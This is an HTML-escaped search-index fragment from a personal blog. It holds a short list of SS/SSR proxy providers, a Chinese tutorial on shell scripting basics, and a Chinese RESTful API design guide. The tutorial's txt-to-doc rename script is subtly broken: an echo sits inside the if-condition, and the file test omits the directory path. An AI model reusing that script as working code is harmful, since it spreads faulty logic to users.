&lt;p&gt;TG： https://t.me/catchflying&lt;/p&gt;
&lt;h3 id=&#34;aaex&#34;&gt;AAEX&lt;/h3&gt;
&lt;p&gt;大概有45+节点&lt;/p&gt;
&lt;p&gt;官网：https://bit.ly/2VRui99&lt;/p&gt;
&lt;h3 id=&#34;dler-cloud&#34;&gt;Dler Cloud&lt;/h3&gt;
&lt;p&gt;机场包括部分中继节点，港台日等地区节点也挺多，150+节点，包括国际标准节点、国际高级节点、国际优化节点、中国大陆节点等等。&lt;/p&gt;
&lt;p&gt;注册购买: https://dlercloud.io&lt;br&gt;
官方网站: https://dlercloud.io&lt;/p&gt;
">SS/SSR提供商</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://jsogn.github.io/post/shell-bian-cheng-ji-chu/"" data-c="
          &lt;h3 id=&#34;前言&#34;&gt;前言&lt;/h3&gt;
&lt;p&gt;Shell的概念是源自Unix的命令解释器。Shell不仅可解释用户输入的命令，同时，可解释执行基于命令的脚本语言。使用shell脚本能提高用户操作和管理员进行系统管理的效率。shell脚本擅长处理纯文本类型的数据，而Linux中几乎所有的配置文件、日志都是纯文本类型。&lt;/p&gt;
&lt;!--more--&gt;
&lt;h3 id=&#34;脚本书写规范&#34;&gt;脚本书写规范&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;1.脚本统一存放目录
2.选择解释器, 开头要写#! XXX,内核根据#!后的解释器来确定用哪个解释器解释脚本内容
3.编辑脚本使用vim, 配置~/.vimrc方便个人书写习惯
4.文件名规范，结尾以sh结束
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;shell的基本元素&#34;&gt;shell的基本元素&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;1.#！/bin/bash 必须的，指出shell的类型
2.# 注释。在shell中，注释写在#之后，#之后的内容不会执行
3.变量
4.控制 循环分支
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;shell中的特殊符号&#34;&gt;shell中的特殊符号&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;1.#! 注明执行脚本采用的shell
2.$ 变量符。
与反斜杠转义符相反，使其后的普通字符作为变量名，如$a表示变量a的值。变量
字符长度超过1个时，用{}括起来
3.单引号。
被引起的字符全部做普通字符，即全部原样echo &#39;my $SHELL&#39;
4.双引号
引号内的内容，除$、转义符\、倒引号`这三个保留特殊功能，其他字符均做普通字符。
5.倒引号(数字1键旁边的那个键）
引号内的字符串当做shell命令行解释执行（同样的功能也可以使用$()来使用），得到的结果
取代整个倒引号括起来的部分。
6.反斜线
反斜线是转义字符，它能把特殊字符变成普通字符。在某个字符前面利用反斜杠（\）能够阻止
shell把后面的字符解释为特殊字符。
7.*  代表0个或者多个特殊字符
例子 yum.* 代表的可以使yum.也可以是yum.a、yum.ab、yum.abc 当然小数点后面可以有多个字母
8.? 代表的是任意一个字符
例子 yum.? 可以是yum.a yum.b yum.c，但是要注意小数点后面必须有任意一个字符
9.[]
代表的是中括号中的任意一个
[abcdef] 可以是a b c d e f 中的任意一个字母当然也可以是数字
[-]代表的是一个范围
[a-z] 表示的是字母a到z之间的所有字母
[^]^是反向选择符号从字面意思可以知道也就是非的意思
[^abc]表示只要不a b c 这三个字符中的任意一个就选择
10.$( )
可以将命令替换输出赋值给变量
11.{}
通过括号扩展可以生成需要的字串，括号中可以包含连续的序列或使用逗号分隔的多个项目，连续的序列包括一个起点和一个终点
user@computer: ~$ echo {a,b,c}
 a b c
user@computer: ~$ echo user{1,5,8}
user1 user5 user8
user@computer: ~$ echo {0..10}
0 1 2 3 4 5 6 7 8 9 10
user@computer: ~$ mkdir {dir1,dir2,dir3}
user@computer: ~$ ls –ld dir{1,2,3}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;变量&#34;&gt;变量&lt;/h3&gt;
&lt;p&gt;shell变量可以保存路径名、文件名或者一个数字等。分为三类：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;本地变量: (局部变量)只在创建它们的Shell中使用，可以在shell程序内任意使用和修改它
们。
环境变量: 可以在创建它们的Shell及其派生出来的任意子程序中使用。有些变量是用户创建
的，其他的则是专用的（比如PATH、HOME)。是系统环境的一部分，不必去定义它们，可以在
shell程序中使用它们 。还能在shell中加以修改。
内部变量: 由系统提供的。与环境变量不同，用户不能修改它们。
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;本地变量&#34;&gt;本地变量&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;本地变量 在用户现在的shell生命期的脚本中使用
 变量名=值
1.等号两边不可以有空格
2.取值包含空格，必须用双引号括起来
3.Shell变量可以用大小写字母，区分大小写

变量是弱类型的, 不用声明类型

# 变量声明及赋值格式
变量=值（等号两边不能有空格）

# 变量的引用
 $变量名
 ${变量名}
 变量名为1个字符时建议使用方式一，多余一个字符时建议使用方式二
 举例: $a ${abc}

# 清除变量
unset 变量名
user@computer: ~$ name=Jack
user@computer: ~$ echo ${name}
user@computer: ~$ unset name  # 注意,name前没有$

# 设置只读变量
设置变量时，不想再改变其值，可以将之设为只读变量
 变量名=值
 readonly  变量名
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;环境变量&#34;&gt;环境变量&lt;/h4&gt;
&lt;p&gt;Bash预设了很多环境变量，实际使用中，可以直接调用这些变量。环境变量可以用于所有子程序，着包括编辑器、脚本和应用&lt;/p&gt;
&lt;p&gt;内置环境变量&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;HOME: 代表使用者的家目录。cd ~ 去到使用者的家目录 或者利用 cd 就可以直接回到使用者
家目录了。
SHELL: 目前这个环境使用的 SHELL 是哪个程序？ 如果是 bash 的话，预设是 /bin/bash
PWD：用户当前工作目录的路径。它指出用户目前在Linux文件系统中处在什么位置。它是由
Linux自动设置的
HISTSIZE: 这个与“历史命令”有关，曾经下达过的指令可以被系统记录下来，而记录的“数目”
则是由这个值来设定的。
PATH: 就是执行文件搜寻的路径，目录与目录中间以冒号(:)分隔， 由于文件的搜寻是依序由
PATH的变量内的目录来查询，所以，目录的顺序也很重要。
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;环境变量可以在命令行中设置，但用户注销时这些值将丢失
   环境变量均为大写
   必须用export命令导出

# 设置环境变量
variable-name=value
export variable-name(环境变量名大写)

# 显示环境变量
env 可以看到所有的环境变量
echo $环境变量名 （显示一个变量）

# 清除环境变量
unset 环境变量名
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;修改path环境变量&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;修改PATH环境变量，使脚本不用加路径，直接输入文件名字即可执行。
# 命令行修改环境变量
以下在用户user主目录下操作：
mkdir shdir &amp;amp;&amp;amp; cd shdir
vi hello
chmod 755 hello
cd ～
export PATH=$PATH:$HOME/shdir
在任何目录下，输入hello即可执行该文件。
本方式下环境变量如果修改错了，exit退出后重新登陆即可恢复系统默认的值。
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;配置文件中修改环境变量&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;注意，修改环境变量前最好先备份一下旧的：
export tem=$PATH
echo $tem &amp;gt;&amp;gt;pathbake

需要知道环境变量与哪些配置文件有关：不同发行版会有不同，但命名还是有通性的：
find / -name “*profile”
find / -name “*bashrc”
全局配置文件/etc/profile
本地配置文件~/.bashrc
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;内部变量&#34;&gt;内部变量&lt;/h4&gt;
&lt;p&gt;内部变量是Linux所提供的一种特殊类型的变量，这类变量在程序中用来作出判断。在shell程序内这类变量的值是不能修改的。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;部分内部变量是：
$# 传送给shell程序的位置参数的数量
$? 最后命令的完成码或者在shell程序内部执行的shell程序（返回值）
$0 shell程序的名称
$* 调用shell程序时所传送的全部参数的单字符串，&amp;quot;参数1&amp;quot;, &amp;quot;参数2&amp;quot;…形式保存的参数
$@ &amp;quot;参数1&amp;quot;, &amp;quot;参数2&amp;quot;…形式保存的参数
$n 第n个参数
$$ 本程序的PID
$! 上一个命令的PID
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;输入与输出&#34;&gt;输入与输出&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;# read 从键盘上读取变量的值
read  [选项]  变量名列表
    常用选项
    -a ANAME   将输入读入ANAME的数组
    -n NCHARS  读入N个字符
    -p PROMPT  显示一个提示
    -r         取消转移
    -s         安静模式，输入的字符将不会提示
    -t TIMEOUT 超过指定时间，read自动停止

# echo 显示字符串或变量的值
echo  [选项]  字符串
    常用选项
    -n  不在最后自动换行
    -e  启用反斜线控制字符的转换
    -E  不处理转义字符。此为缺省选项；
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;#! /bin/bash
# 输入一句话，打印输入的话
read -p &#39;please type some words, I will print them: &#39; words
echo $words
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;条件测试&#34;&gt;条件测试&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;# test
test 条件表达式
如果测试条件为真，test命令会返回0，否则返回一个非0的数值
test 语句与if/then和case语句一起，构成shell编程的控制转移结构

# []
[ 条件表达式 ]
方括号的内侧两边各需一个空格

条件表达式的值为真返回零，为假时返回非零值

&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;文件状态判断&#34;&gt;文件状态判断&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;-d filename	若文件filename为目录文件，则返回真

-f filename	文件是否存在且为普通文件，则返回真

-r filename	若文件filename可读，则返回真

-s filename	若文件filename的长度大于0，则返回真

-w filename	若文件filename可写，则返回真

-x filename	若文件filename可执行，则返回真

-e filename	文件是否存在

&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;#! /bin/bash
# 输入文件的绝对路径，判断文件是否存在
read  -p &#39;input file path: &#39; file
if [ -e $file ]
    then
    echo &#39;文件存在&#39;
else
    echo &#39;文件不存在&#39;
fi
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;条件语句&#34;&gt;条件语句&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;if  [ 条件表达式 ]
    then
    命令序列1
else
    命令序列2
fi
当&amp;quot;条件表达式&amp;quot;的测试值为真时，执行&amp;quot;命令序列1&amp;quot;，否则，执行&amp;quot;命令序列2&amp;quot;。命令序列中的命令
可以是一个或者多个。


if [ 条件表达式 ]; then
    命令序列
fi
当&amp;quot;条件表达式&amp;quot;的测试值为真时，执行&amp;quot;命令序列&amp;quot;,否则，执行条件语句后面的命令。条件表达
式与then之间的分号&amp;quot;;&amp;quot;起命令分隔符的作用。

语法形式三

if test 条件表达式1
    then
    命令序列1
elif [ 条件表达式2 ]
    then
    命令序列2
else
    命令序列3
fi
这是包含二层嵌套的条件语句，当&amp;quot;条件表达式1&amp;quot;为真时，执行&amp;quot;命令序列1&amp;quot;,否则，在&amp;quot;条件表
达式2&amp;quot;为真的情况下，执行&amp;quot;命令序列2&amp;quot;，否则，执行&amp;quot;命令序列3&amp;quot;,&amp;quot;命令序列3&amp;quot;属于第2个条
件语句的一部分。
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;#! /bin/bash
# 判断输入的路径是文件还是目录
read -p &#39;please input the file path: &#39; file
if [ -d $file ]
    then
    echo &#39;this is a directory&#39;
elif [ -f $file ]
    then
    echo &#39;this is a file&#39;
else
    echo &#39;wrong file type, or the file do not exist&#39;
fi
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;数字操作符&#34;&gt;数字操作符&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;n1 –eq n2判断数字n1与n2是否相等，若相等，返回0，否则，返回1

n1 –ne n2判断数字n1与n2是否不等，若不等，返回0，否则，返回1

n1 –lt n2判断数字n1是否小于n2，若是，返回0，否则，返回1

n1 –gt n2判断数字n1是否大于n2，若是，返回0，否则，返回1

n1 –le n2判断数字n1是否小于或等于n2，若是，返回0，否则，返回1

n1 –ge n2 判断数字n1是否大于或等于n2，若是，返回0，否则，返回1

&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;字符串操作符&#34;&gt;字符串操作符&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;string 若字符串string非空，则返回真


-n string 若字符串string长度大于0，则返回真


-z string 若字符串string长度为0，则为返回真


string1 = string2 若字符串string1和string2相等，则返回真


string1 != string2 若字符串string1和 string2不等，则返回真

&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;逻辑操作符&#34;&gt;逻辑操作符&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;e1 –a e2	逻辑表达式e1和e2同时为真时，返回0，否则，返回1
e1 –o e2	逻辑表达式e1和e2有一个为真时，返回0，否则，返回1
! e1	    若逻辑表达式e1不为真时，返回0，,否则，返回1
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;循环语句&#34;&gt;循环语句&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;for 变量名 in 参数列表
    do
    命令列表
done
将&amp;quot;参数列表&amp;quot;中的元素依次赋给&amp;quot;变量名&amp;quot;，在每次赋值后执行&amp;quot;命令列表&amp;quot;，&amp;quot;参数列表&amp;quot;表示&amp;quot;变
量名&amp;quot;的取值范围

for ((初始化变量值；结束循环条件；运算))
    do
    命令序列
done

while [ 条件表达式 ]
    do
    命令列表
done
循环执行&amp;quot;命令列表&amp;quot;中的命令，直至&amp;quot;条件表达式&amp;quot;的值为假。

Until [ 条件 ]
    do
    命令序列
Done
直到条件满足时循环结束

&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;#! /bin/bash
# 将指定目录下(参数传递$1)的所有以.txt为后缀的文件更名为*.doc
directory=$1
if [ ! $directory ]
  then
  echo &amp;quot;please input the argument directory&amp;quot;
  exit
fi
files=`ls ${directory}`
for file in $files;
  do
  if [ -f ${file} ]
    echo $file
    then
    suffix=${file#*\.}
    echo $suffix
    if [[ $suffix == &amp;quot;txt&amp;quot; ]]
      then
      prefix=${file%\.*}
      mv $directory/$file $directory/$prefix.doc
    fi
  fi
done
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;函数&#34;&gt;函数&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;functionname() {
    命令列表
    return
}
函数的调用方式为：
functionname arguments
&lt;/code&gt;&lt;/pre&gt;
">shell编程基础</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://jsogn.github.io/post/resetful-api-she-ji-gui-fan/"" data-c="
          &lt;h3 id=&#34;前言&#34;&gt;前言&lt;/h3&gt;
&lt;p&gt;工欲善其事，必先利其器，一个健壮的API必要有优秀的设计规范，本文是最基本的设计理念&lt;/p&gt;
&lt;!--more--&gt;
&lt;h3 id=&#34;协议&#34;&gt;协议&lt;/h3&gt;
&lt;p&gt;在通过 API 于后端服务通信的过程中，应该 使用 HTTPS 协议。&lt;/p&gt;
&lt;h3 id=&#34;api-root-url&#34;&gt;API Root URL&lt;/h3&gt;
&lt;p&gt;API 的根入口点应尽可能保持足够简单，这里有两个常见的 URL 根例子：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;api.example.com/*
example.com/api/*
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;如果你的应用很庞大或者你预计它将会变的很庞大，那 应该 将 API 放到子域下。这种做法可以保持某些规模化上的灵活性。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;versioning&#34;&gt;Versioning&lt;/h3&gt;
&lt;p&gt;所有的 API 必须保持向后兼容，你 必须 在引入新版本 API 的同时确保旧版本 API 仍然可用。所以 应该 为其提供版本支持。&lt;/p&gt;
&lt;p&gt;目前比较常见的两种版本号形式：&lt;/p&gt;
&lt;p&gt;在 URL 中嵌入版本编号&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;api.example.com/v1/*
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这种做法是版本号直观、易于调试；另一种做法是，将版本号放在 HTTP Header 头中：&lt;br&gt;
通过媒体类型来指定版本信息&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Accept: application/vnd.example.com.v1+json
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;其中 vnd 表示 Standards Tree 标准树类型，有三个不同的树: x，prs 和 vnd。你使用的标准树需要取决于你开发的项目&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;未注册的树（x）主要表示本地和私有环境&lt;/li&gt;
&lt;li&gt;私有树（prs）主要表示没有商业发布的项目&lt;/li&gt;
&lt;li&gt;供应商树（vnd）主要表示公开发布的项目&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;后面几个参数依次为应用名称（一般为应用域名）、版本号、期望的返回格式。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;endpoints&#34;&gt;Endpoints&lt;/h3&gt;
&lt;p&gt;端点就是指向特定资源或资源集合的 URL。在端点的设计中，你 必须 遵守下列约定:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;URL 的命名 必须 全部小写&lt;/li&gt;
&lt;li&gt;URL 中资源（resource）的命名 必须 是名词，并且 必须 是复数形式&lt;/li&gt;
&lt;li&gt;必须 优先使用 Restful 类型的 URL&lt;/li&gt;
&lt;li&gt;URL 中不能出现 -，必须 用下划线 _ 代替&lt;/li&gt;
&lt;li&gt;URL 必须 是易读的&lt;/li&gt;
&lt;li&gt;URL 一定不可 暴露服务器架构&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;http-动词&#34;&gt;HTTP 动词&lt;/h3&gt;
&lt;p&gt;对于资源的具体操作类型，由 HTTP 动词表示。常用的 HTTP 动词有下面五个（括号里是对应的 SQL 命令）。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;GET（SELECT）：从服务器取出资源（一项或多项）。&lt;/li&gt;
&lt;li&gt;POST（CREATE）：在服务器新建一个资源。&lt;/li&gt;
&lt;li&gt;PUT（UPDATE）：在服务器更新资源（客户端提供改变后的完整资源）。&lt;/li&gt;
&lt;li&gt;PATCH（UPDATE）：在服务器更新资源（客户端提供改变的属性）。&lt;/li&gt;
&lt;li&gt;DELETE（DELETE）：从服务器删除资源。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;filtering&#34;&gt;Filtering&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;如果记录数量很多，服务器不可能都将它们返回给用户。API 应该 提供参数，过滤返回结果。下面是一些常见的参数。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;?limit=10：指定返回记录的数量&lt;/li&gt;
&lt;li&gt;?offset=10：指定返回记录的开始位置。&lt;/li&gt;
&lt;li&gt;?page=2&amp;amp;per_page=100：指定第几页，以及每页的记录数。&lt;/li&gt;
&lt;li&gt;?sortby=name&amp;amp;order=asc：指定返回结果按照哪个属性排序，以及排序顺序。&lt;/li&gt;
&lt;li&gt;?animal_type_id=1：指定筛选条件&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;所有 URL 参数 必须 是全小写，必须 使用下划线类型的参数形式。&lt;/p&gt;
&lt;p&gt;经常使用的、复杂的查询 应该 标签化，降低维护成本。如&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;GET /trades?status=closed&amp;amp;sort=sortby=name&amp;amp;order=asc
# 可为其定制快捷方式
GET /trades/recently_closed
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;authentication&#34;&gt;Authentication&lt;/h3&gt;
&lt;p&gt;应该 使用 OAuth2.0 的方式为 API 调用者提供登录认证。必须 先通过登录接口获取 Access Token 后再通过该 token 调用需要身份认证的 API。&lt;/p&gt;
&lt;p&gt;Oauth 的端点设计示列&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;RFC 6749   /token&lt;/li&gt;
&lt;li&gt;Twitter    /oauth2/token&lt;/li&gt;
&lt;li&gt;Fackbook   /oauth/access_token&lt;/li&gt;
&lt;li&gt;Google     /o/oauth2/token&lt;/li&gt;
&lt;li&gt;Github     /login/oauth/access_token&lt;/li&gt;
&lt;li&gt;Instagram  /oauth/authorize&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;客户端在获得 access token 的同时 必须 在响应中包含一个名为 expires_in 的数据，它表示当前获得的 token 会在多少 秒 后失效。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;{
    &amp;quot;access_token&amp;quot;: &amp;quot;token....&amp;quot;,
    &amp;quot;token_type&amp;quot;: &amp;quot;Bearer&amp;quot;,
    &amp;quot;expires_in&amp;quot;: 3600
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;客户端在请求需要认证的 API 时，必须 在请求头 Authorization 中带上 access_token。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Authorization: Bearer token...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;当超过指定的秒数后，access token 就会过期，再次用过期/或无效的 token 访问时，服务端 应该 返回 invalid_token 的错误或 401 错误码。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;HTTP/1.1 401 Unauthorized
Content-Type: application/json
Cache-Control: no-store
Pragma: no-cache

{
    &amp;quot;error&amp;quot;: &amp;quot;invalid_token&amp;quot;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;Laravel 开发中，应该 使用 JWT 来为管理你的 Token，并且 一定不可 在 api 中间件中开启请求 session。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;response&#34;&gt;Response&lt;/h3&gt;
&lt;p&gt;所有的 API 响应，必须 遵守 HTTP 设计规范，必须 选择合适的 HTTP 状态码。一定不可 所有接口都返回状态码为 200 的 HTTP 响应，如:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;HTTP/1.1 200 ok
Content-Type: application/json
Server: example.com

{
    &amp;quot;code&amp;quot;: 0,
    &amp;quot;msg&amp;quot;: &amp;quot;success&amp;quot;,
    &amp;quot;data&amp;quot;: {
        &amp;quot;username&amp;quot;: &amp;quot;username&amp;quot;
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;常见的 HTTP 状态码&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;状态码&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;1xx&lt;/td&gt;
&lt;td&gt;代表请求已被接受，需要继续处理&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2xx&lt;/td&gt;
&lt;td&gt;请求已成功，请求所希望的响应头或数据体将随此响应返回&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3xx&lt;/td&gt;
&lt;td&gt;重定向&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;4xx&lt;/td&gt;
&lt;td&gt;客户端引起的错误&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;5xx&lt;/td&gt;
&lt;td&gt;服务端引起的错误&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;blockquote&gt;
&lt;p&gt;只有来自客户端的请求被正确的处理后才能返回 2xx 的响应，所以当 API 返回 2xx 类型的状态码时，前端 必须 认定该请求已处理成功。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;必须强调的是，所有 API 一定不可 返回 1xx 类型的状态码。当 API 发生错误时，必须 返回出错时的详细信息。目前常见返回错误信息的方法有两种：&lt;/p&gt;
&lt;p&gt;1、将错误详细放入 HTTP 响应首部；&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;X-MYNAME-ERROR-CODE: 4001
X-MYNAME-ERROR-MESSAGE: Bad authentication token
X-MYNAME-ERROR-INFO: http://docs.example.com/api/v1/authentication
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;2、直接放入响应实体中；&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;HTTP/1.1 401 Unauthorized
Server: nginx/1.11.9
Content-Type: application/json
Transfer-Encoding: chunked
Cache-Control: no-cache, private
Date: Sun, 24 Jun 2018 10:02:59 GMT
Connection: keep-alive

{&amp;quot;error_code&amp;quot;:40100,&amp;quot;message&amp;quot;:&amp;quot;Unauthorized&amp;quot;}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;考虑到易读性和客户端的易处理性，我们 必须 把错误信息直接放到响应实体中，并且错误格式 应该 满足如下格式：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;{
    &amp;quot;message&amp;quot;: &amp;quot;您查找的资源不存在&amp;quot;,
    &amp;quot;error_code&amp;quot;: 404001
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;其中错误码（error_code）必须 和 HTTP 状态码对应，也方便错误码归类，如：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;HTTP/1.1 429 Too Many Requests
Server: nginx/1.11.9
Content-Type: application/json
Transfer-Encoding: chunked
Cache-Control: no-cache, private
Date: Sun, 24 Jun 2018 10:15:52 GMT
Connection: keep-alive

{&amp;quot;error_code&amp;quot;:429001,&amp;quot;message&amp;quot;:&amp;quot;你操作太频繁了&amp;quot;}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;应该 在返回的错误信息中，同时包含面向开发者和面向用户的提示信息，前者可方便开发人员调试，后者可直接展示给终端用户查看如：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;{
    &amp;quot;message&amp;quot;: &amp;quot;直接展示给终端用户的错误信息&amp;quot;,
    &amp;quot;error_code&amp;quot;: &amp;quot;业务错误码&amp;quot;,
    &amp;quot;error&amp;quot;: &amp;quot;供开发者查看的错误信息&amp;quot;,
    &amp;quot;debug&amp;quot;: [
        &amp;quot;错误堆栈，必须开启 debug 才存在&amp;quot;
    ]
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;下面详细列举了各种情况 API 的返回说明。&lt;/p&gt;
&lt;h3 id=&#34;200-ok&#34;&gt;200 ok&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;200 状态码是最常见的 HTTP 状态码，在所有 成功 的 GET 请求中，必须 返回此状态码。HTTP 响应实体部分 必须 直接就是数据，不要做多余的包装。

{
    &amp;quot;data&amp;quot;: [
        {
            &amp;quot;id&amp;quot;: 1,
            &amp;quot;avatar&amp;quot;: &amp;quot;https://lorempixel.com/640/480/?32556&amp;quot;,
            &amp;quot;nickname&amp;quot;: &amp;quot;fwest&amp;quot;,
            &amp;quot;last_logined_time&amp;quot;: &amp;quot;2018-05-29 04:56:43&amp;quot;,
            &amp;quot;has_registed&amp;quot;: true
        },
        {
            &amp;quot;id&amp;quot;: 2,
            &amp;quot;avatar&amp;quot;: &amp;quot;https://lorempixel.com/640/480/?86144&amp;quot;,
            &amp;quot;nickname&amp;quot;: &amp;quot;zschowalter&amp;quot;,
            &amp;quot;last_logined_time&amp;quot;: &amp;quot;2018-06-16 15:18:34&amp;quot;,
            &amp;quot;has_registed&amp;quot;: true
        }
    ],
    &amp;quot;meta&amp;quot;: {
        &amp;quot;pagination&amp;quot;: {
            &amp;quot;total&amp;quot;: 101,
            &amp;quot;count&amp;quot;: 2,
            &amp;quot;per_page&amp;quot;: 2,
            &amp;quot;current_page&amp;quot;: 1,
            &amp;quot;total_pages&amp;quot;: 51,
            &amp;quot;links&amp;quot;: {
                &amp;quot;next&amp;quot;: &amp;quot;http://api.example.com?page=2&amp;quot;
            }
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;其中，分页和其他额外的媒体信息，必须放到 meta 字段中。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;201-created&#34;&gt;201 Created&lt;/h3&gt;
&lt;p&gt;当服务器创建数据成功时，应该 返回此状态码。常见的应用场景是使用 POST 提交用户信息，如：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;添加了新用户&lt;/li&gt;
&lt;li&gt;上传了图片&lt;/li&gt;
&lt;li&gt;创建了新活动&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;等，都可以返回 201 状态码。需要注意的是，你可以选择在用户创建成功后返回新用户的数据&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;HTTP/1.1 201 Created
Server: nginx/1.11.9
Content-Type: application/json
Transfer-Encoding: chunked
Date: Sun, 24 Jun 2018 09:13:40 GMT
Connection: keep-alive

{
    &amp;quot;id&amp;quot;: 1,
    &amp;quot;avatar&amp;quot;: &amp;quot;https:\/\/lorempixel.com\/640\/480\/?32556&amp;quot;,
    &amp;quot;nickname&amp;quot;: &amp;quot;fwest&amp;quot;,
    &amp;quot;last_logined_time&amp;quot;: &amp;quot;2018-05-29 04:56:43&amp;quot;,
    &amp;quot;created_at&amp;quot;: &amp;quot;2018-06-16 17:55:55&amp;quot;,
    &amp;quot;updated_at&amp;quot;: &amp;quot;2018-06-16 17:55:55&amp;quot;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;也可以返回一个响应实体为空的 HTTP Response 如：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;HTTP/1.1 201 Created
Server: nginx/1.11.9
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Date: Sun, 24 Jun 2018 09:12:20 GMT
Connection: keep-alive
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
